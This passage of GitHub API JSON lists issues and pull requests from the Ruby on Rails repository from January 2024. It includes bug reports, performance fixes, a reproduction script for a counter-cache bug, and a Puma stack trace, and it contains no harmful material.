            "received_events_url": "https://api.github.com/users/tenderlove/received_events",
            "type": "User",
            "site_admin": false
        },
        "assignees": [
            {
                "login": "tenderlove",
                "id": 3124,
                "node_id": "MDQ6VXNlcjMxMjQ=",
                "avatar_url": "https://avatars.githubusercontent.com/u/3124?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/tenderlove",
                "html_url": "https://github.com/tenderlove",
                "followers_url": "https://api.github.com/users/tenderlove/followers",
                "following_url": "https://api.github.com/users/tenderlove/following{/other_user}",
                "gists_url": "https://api.github.com/users/tenderlove/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/tenderlove/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/tenderlove/subscriptions",
                "organizations_url": "https://api.github.com/users/tenderlove/orgs",
                "repos_url": "https://api.github.com/users/tenderlove/repos",
                "events_url": "https://api.github.com/users/tenderlove/events{/privacy}",
                "received_events_url": "https://api.github.com/users/tenderlove/received_events",
                "type": "User",
                "site_admin": false
            }
        ],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-16T19:20:45Z",
        "updated_at": "2024-02-11T15:40:31Z",
        "closed_at": "2024-01-16T19:41:54Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50771",
            "html_url": "https://github.com/rails/rails/pull/50771",
            "diff_url": "https://github.com/rails/rails/pull/50771.diff",
            "patch_url": "https://github.com/rails/rails/pull/50771.patch",
            "merged_at": "2024-01-16T19:41:54Z"
        },
        "body": "Backport active storage N+1 bugfix",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50771/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50771/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50770",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50770/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50770/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50770/events",
        "html_url": "https://github.com/rails/rails/issues/50770",
        "id": 2084529336,
        "node_id": "I_kwDNIULOfD9kuA",
        "number": 50770,
        "title": "Request: rename Rails console as irr or something other than irb",
        "user": {
            "login": "MtnBiker",
            "id": 138920,
            "node_id": "MDQ6VXNlcjEzODkyMA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/138920?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/MtnBiker",
            "html_url": "https://github.com/MtnBiker",
            "followers_url": "https://api.github.com/users/MtnBiker/followers",
            "following_url": "https://api.github.com/users/MtnBiker/following{/other_user}",
            "gists_url": "https://api.github.com/users/MtnBiker/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/MtnBiker/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/MtnBiker/subscriptions",
            "organizations_url": "https://api.github.com/users/MtnBiker/orgs",
            "repos_url": "https://api.github.com/users/MtnBiker/repos",
            "events_url": "https://api.github.com/users/MtnBiker/events{/privacy}",
            "received_events_url": "https://api.github.com/users/MtnBiker/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 41328116,
                "node_id": "MDU6TGFiZWw0MTMyODExNg==",
                "url": "https://api.github.com/repos/rails/rails/labels/attached%20PR",
                "name": "attached PR",
                "color": "006b75",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 23,
        "created_at": "2024-01-16T17:57:38Z",
        "updated_at": "2024-01-28T04:46:27Z",
        "closed_at": "2024-01-19T19:11:52Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "Maybe not the right place to post this.\r\n\r\nBut it's confusing that the prompt for irb and rails console is the same.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50770/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50770/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50769",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50769/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50769/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50769/events",
        "html_url": "https://github.com/rails/rails/pull/50769",
        "id": 2084521274,
        "node_id": "PR_kwDNIULOZDlkIQ",
        "number": 50769,
        "title": "Use `includes` instead of `eager_load` for `with_all_rich_text`",
        "user": {
            "login": "p8",
            "id": 28561,
            "node_id": "MDQ6VXNlcjI4NTYx",
            "avatar_url": "https://avatars.githubusercontent.com/u/28561?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/p8",
            "html_url": "https://github.com/p8",
            "followers_url": "https://api.github.com/users/p8/followers",
            "following_url": "https://api.github.com/users/p8/following{/other_user}",
            "gists_url": "https://api.github.com/users/p8/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/p8/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/p8/subscriptions",
            "organizations_url": "https://api.github.com/users/p8/orgs",
            "repos_url": "https://api.github.com/users/p8/repos",
            "events_url": "https://api.github.com/users/p8/events{/privacy}",
            "received_events_url": "https://api.github.com/users/p8/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 1180817762,
                "node_id": "MDU6TGFiZWwxMTgwODE3NzYy",
                "url": "https://api.github.com/repos/rails/rails/labels/actiontext",
                "name": "actiontext",
                "color": "3bc667",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-16T17:51:45Z",
        "updated_at": "2024-01-17T00:13:02Z",
        "closed_at": "2024-01-16T23:28:38Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50769",
            "html_url": "https://github.com/rails/rails/pull/50769",
            "diff_url": "https://github.com/rails/rails/pull/50769.diff",
            "patch_url": "https://github.com/rails/rails/pull/50769.patch",
            "merged_at": "2024-01-16T23:28:38Z"
        },
        "body": "### Motivation / Background\r\n\r\n`eager_load` performs a single query using a `LEFT OUTER JOIN` to load the associations. Loading the associations in a join can result in many rows that contain redundant data and it performs poorly at scale.\r\n\r\nWith `includes` a separate query is performed for each association, unless a join is required by conditions.\r\n\r\n`includes` is also used by similar methods in Active Storage like `with_attached_*`.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50769/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50769/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50768",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50768/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50768/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50768/events",
        "html_url": "https://github.com/rails/rails/issues/50768",
        "id": 2084328879,
        "node_id": "I_kwDNIULOfDxVrw",
        "number": 50768,
        "title": "The `counter_cache_column?` method is depending of initialisation order.",
        "user": {
            "login": "BuonOmo",
            "id": 11378424,
            "node_id": "MDQ6VXNlcjExMzc4NDI0",
            "avatar_url": "https://avatars.githubusercontent.com/u/11378424?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/BuonOmo",
            "html_url": "https://github.com/BuonOmo",
            "followers_url": "https://api.github.com/users/BuonOmo/followers",
            "following_url": "https://api.github.com/users/BuonOmo/following{/other_user}",
            "gists_url": "https://api.github.com/users/BuonOmo/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/BuonOmo/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/BuonOmo/subscriptions",
            "organizations_url": "https://api.github.com/users/BuonOmo/orgs",
            "repos_url": "https://api.github.com/users/BuonOmo/repos",
            "events_url": "https://api.github.com/users/BuonOmo/events{/privacy}",
            "received_events_url": "https://api.github.com/users/BuonOmo/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-16T15:54:58Z",
        "updated_at": "2024-01-20T17:21:11Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :people, force: true do |t|\r\n    t.integer :cars_count, default: 0\r\n  end\r\n\r\n  create_table :cars, force: true do |t|\r\n    t.belongs_to :person\r\n  end\r\nend\r\n\r\nclass Car < ActiveRecord::Base\r\n  belongs_to :person, counter_cache: true\r\nend\r\n\r\n# If the `Person` class was defined before, the test below would work\r\nclass Person < ActiveRecord::Base\r\n  has_many :cars\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_counter_cache_column?\r\n    assert Person.counter_cache_column?(\"cars_count\")\r\n    assert_not Car.counter_cache_column?(\"cars_count\")\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n\r\nthe `Person` class should identify clearly `cars_count` as a counter cache column\r\n\r\n### Actual behavior\r\n\r\nSince `Person` is initialized afterwards, when running `belong_to`, the `cars_count` column is not added to its counter_cache\r\n\r\n### System configuration\r\n**Rails version**: found in `7.1.2`, present in edge as well\r\n\r\n**Ruby version**: 3.2.1\r\n\r\n### Notes\r\n\r\nIn the actual ActiveRecord test suite, this test could fall if in the future a file requiring first `models/car` is loaded before the `counter_cache_test` file.\r\n\r\nAlso I'd be so glad to work on the solution. It seems to me that the issue is that [this expression](https://github.com/rails/rails/blob/0656787be644d7d5550e82450153403853c73014/activerecord/lib/active_record/associations/builder/belongs_to.rb#L39C5-L39C5) can return `nil`. I'm just not sure how it should be solved (by raising, autoloading, warning, ...)\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50768/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50768/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50767",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50767/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50767/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50767/events",
        "html_url": "https://github.com/rails/rails/pull/50767",
        "id": 2084265200,
        "node_id": "PR_kwDNIULOZDXkuA",
        "number": 50767,
        "title": "Fix calculation of SQL runtime",
        "user": {
            "login": "rporrasluc",
            "id": 1927062,
            "node_id": "MDQ6VXNlcjE5MjcwNjI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1927062?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/rporrasluc",
            "html_url": "https://github.com/rporrasluc",
            "followers_url": "https://api.github.com/users/rporrasluc/followers",
            "following_url": "https://api.github.com/users/rporrasluc/following{/other_user}",
            "gists_url": "https://api.github.com/users/rporrasluc/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/rporrasluc/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/rporrasluc/subscriptions",
            "organizations_url": "https://api.github.com/users/rporrasluc/orgs",
            "repos_url": "https://api.github.com/users/rporrasluc/repos",
            "events_url": "https://api.github.com/users/rporrasluc/events{/privacy}",
            "received_events_url": "https://api.github.com/users/rporrasluc/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 11,
        "created_at": "2024-01-16T15:26:53Z",
        "updated_at": "2024-01-17T10:33:25Z",
        "closed_at": "2024-01-16T16:21:05Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50767",
            "html_url": "https://github.com/rails/rails/pull/50767",
            "diff_url": "https://github.com/rails/rails/pull/50767.diff",
            "patch_url": "https://github.com/rails/rails/pull/50767.patch",
            "merged_at": "2024-01-16T16:21:05Z"
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request has been created because [this other PR](https://github.com/rails/rails/pull/50493) seems to have introduced a bug in the `db_runtime` emitted as part of `sql.active_record` notification.\r\n\r\nThe time is calculated using `ActiveSupport::Notifications.monotonic_subscribe` which uses [Process.clock_gettime(Process::CLOCK_MONOTONIC)](https://github.com/rails/rails/blob/main/activesupport/lib/active_support/notifications/fanout.rb#L142) with the default unit (seconds).\r\n\r\nThis being run in a Rails console prints 1.\r\n\r\n```ruby\r\nActiveSupport::Notifications.monotonic_subscribe(\"test_event\") do |_name, start, finish, _id, payload|\r\n  puts finish - start\r\nend\r\n\r\nActiveSupport::Notifications.instrument(\"test_event\") do\r\n  sleep 1.second\r\nend\r\n```\r\n\r\nAlso, when an `ActiveSupport::Notifications::Event` is used, [it needs to multiply start and ending](https://github.com/rails/rails/blob/main/activesupport/lib/active_support/notifications/instrumenter.rb#L113) by `1_000.0` same as we are proposing here.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50767/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50767/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50766",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50766/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50766/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50766/events",
        "html_url": "https://github.com/rails/rails/pull/50766",
        "id": 2083785584,
        "node_id": "PR_kwDNIULOZC80Nw",
        "number": 50766,
        "title": "Modernize method missing implementations",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107188,
                "node_id": "MDU6TGFiZWwxMDcxODg=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailer",
                "name": "actionmailer",
                "color": "8B00FC",
                "default": false,
                "description": null
            },
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 107190,
                "node_id": "MDU6TGFiZWwxMDcxOTA=",
                "url": "https://api.github.com/repos/rails/rails/labels/activemodel",
                "name": "activemodel",
                "color": "00E5FF",
                "default": false,
                "description": null
            },
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-16T12:03:00Z",
        "updated_at": "2024-01-16T12:28:40Z",
        "closed_at": "2024-01-16T12:28:40Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50766",
            "html_url": "https://github.com/rails/rails/pull/50766",
            "diff_url": "https://github.com/rails/rails/pull/50766.diff",
            "patch_url": "https://github.com/rails/rails/pull/50766.patch",
            "merged_at": "2024-01-16T12:28:40Z"
        },
        "body": "`...` is both simpler an more correct since the keyword argument separation.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50766/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50766/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50765",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50765/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50765/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50765/events",
        "html_url": "https://github.com/rails/rails/issues/50765",
        "id": 2083098777,
        "node_id": "I_kwDNIULOfCmQmQ",
        "number": 50765,
        "title": "Assets Precompile Issue on CircleICi",
        "user": {
            "login": "raoehtesham03",
            "id": 152256436,
            "node_id": "U_kgDOCRM_tA",
            "avatar_url": "https://avatars.githubusercontent.com/u/152256436?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/raoehtesham03",
            "html_url": "https://github.com/raoehtesham03",
            "followers_url": "https://api.github.com/users/raoehtesham03/followers",
            "following_url": "https://api.github.com/users/raoehtesham03/following{/other_user}",
            "gists_url": "https://api.github.com/users/raoehtesham03/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/raoehtesham03/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/raoehtesham03/subscriptions",
            "organizations_url": "https://api.github.com/users/raoehtesham03/orgs",
            "repos_url": "https://api.github.com/users/raoehtesham03/repos",
            "events_url": "https://api.github.com/users/raoehtesham03/events{/privacy}",
            "received_events_url": "https://api.github.com/users/raoehtesham03/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-16T06:23:07Z",
        "updated_at": "2024-01-16T08:05:16Z",
        "closed_at": "2024-01-16T08:04:50Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\nI have upgraded my rails application from 6.1 to 7.0. So, while running the test cases on CircleCi it is not able to execute below line :-\r\n                   stylesheet_link_tag \"mailer\r\nHowever, everything is working fine on local.\r\n\r\n\r\n### Actual behavior\r\n Failure/Error: = stylesheet_link_tag \"mailer\"\r\n     \r\n     ActionView::Template::Error:\r\n       Error: StringMap expected string key\r\n\r\n### System configuration\r\n**Rails version**: 7.0.8\r\n\r\n**Ruby version**: 3.0.6\r\n\r\n\r\n\r\nIs this related to assets precompile on CircleCi ?\r\nPlease help me to figure out this.\r\n\r\n\r\nI am getting this error on \r\n\r\n\r\n        rake assets:precompile\r\n                      \r\n                      \r\n        rake aborted! ExecJS::ProgramError: Error: StringMap expected string key stringmap.set\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50765/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50765/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50764",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50764/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50764/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50764/events",
        "html_url": "https://github.com/rails/rails/pull/50764",
        "id": 2082888408,
        "node_id": "PR_kwDNIULOZCLrrw",
        "number": 50764,
        "title": "Handle nil backtrace_locations in SyntaxErrorProxy",
        "user": {
            "login": "eugeneius",
            "id": 432189,
            "node_id": "MDQ6VXNlcjQzMjE4OQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/432189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/eugeneius",
            "html_url": "https://github.com/eugeneius",
            "followers_url": "https://api.github.com/users/eugeneius/followers",
            "following_url": "https://api.github.com/users/eugeneius/following{/other_user}",
            "gists_url": "https://api.github.com/users/eugeneius/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/eugeneius/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/eugeneius/subscriptions",
            "organizations_url": "https://api.github.com/users/eugeneius/orgs",
            "repos_url": "https://api.github.com/users/eugeneius/repos",
            "events_url": "https://api.github.com/users/eugeneius/events{/privacy}",
            "received_events_url": "https://api.github.com/users/eugeneius/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-16T01:52:00Z",
        "updated_at": "2024-01-16T15:33:59Z",
        "closed_at": "2024-01-16T14:20:13Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50764",
            "html_url": "https://github.com/rails/rails/pull/50764",
            "diff_url": "https://github.com/rails/rails/pull/50764.diff",
            "patch_url": "https://github.com/rails/rails/pull/50764.patch",
            "merged_at": "2024-01-16T14:20:13Z"
        },
        "body": "Some `SyntaxError`s do not have `backtrace_locations` set. Previously this would cause an error that would bubble up to the web server, e.g. with Puma:\r\n\r\n```\r\nPuma caught this error: undefined method `map' for nil:NilClass (NoMethodError)\r\n/Users/eugene/lib/rails/activesupport/lib/active_support/syntax_error_proxy.rb:41:in `backtrace_locations'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/exception_wrapper.rb:268:in `build_backtrace'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/exception_wrapper.rb:56:in `initialize'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/exception_wrapper.rb:289:in `new'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/exception_wrapper.rb:289:in `block in wrapped_causes_for'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/exception_wrapper.rb:285:in `causes_for'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/exception_wrapper.rb:289:in `each'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/exception_wrapper.rb:289:in `map'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/exception_wrapper.rb:289:in `wrapped_causes_for'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/exception_wrapper.rb:51:in `initialize'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/show_exceptions.rb:35:in `new'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/show_exceptions.rb:35:in `rescue in call'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/show_exceptions.rb:30:in `call'\r\n/Users/eugene/lib/rails/railties/lib/rails/rack/logger.rb:37:in `call_app'\r\n/Users/eugene/lib/rails/railties/lib/rails/rack/logger.rb:24:in `block in call'\r\n/Users/eugene/lib/rails/activesupport/lib/active_support/tagged_logging.rb:135:in `block in tagged'\r\n/Users/eugene/lib/rails/activesupport/lib/active_support/tagged_logging.rb:39:in `tagged'\r\n/Users/eugene/lib/rails/activesupport/lib/active_support/tagged_logging.rb:135:in `tagged'\r\n/Users/eugene/lib/rails/activesupport/lib/active_support/broadcast_logger.rb:240:in `method_missing'\r\n/Users/eugene/lib/rails/railties/lib/rails/rack/logger.rb:24:in `call'\r\n/Users/eugene/.rbenv/versions/3.2.2/lib/ruby/gems/3.2.0/gems/sprockets-rails-3.4.2/lib/sprockets/rails/quiet_assets.rb:13:in `call'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/remote_ip.rb:92:in `call'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/request_id.rb:28:in `call'\r\n/Users/eugene/.rbenv/versions/3.2.2/lib/ruby/gems/3.2.0/gems/rack-3.0.8/lib/rack/method_override.rb:28:in `call'\r\n/Users/eugene/.rbenv/versions/3.2.2/lib/ruby/gems/3.2.0/gems/rack-3.0.8/lib/rack/runtime.rb:24:in `call'\r\n/Users/eugene/lib/rails/activesupport/lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/server_timing.rb:59:in `block in call'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/server_timing.rb:24:in `collect_events'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/server_timing.rb:58:in `call'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/executor.rb:14:in `call'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/static.rb:25:in `call'\r\n/Users/eugene/.rbenv/versions/3.2.2/lib/ruby/gems/3.2.0/gems/rack-3.0.8/lib/rack/sendfile.rb:114:in 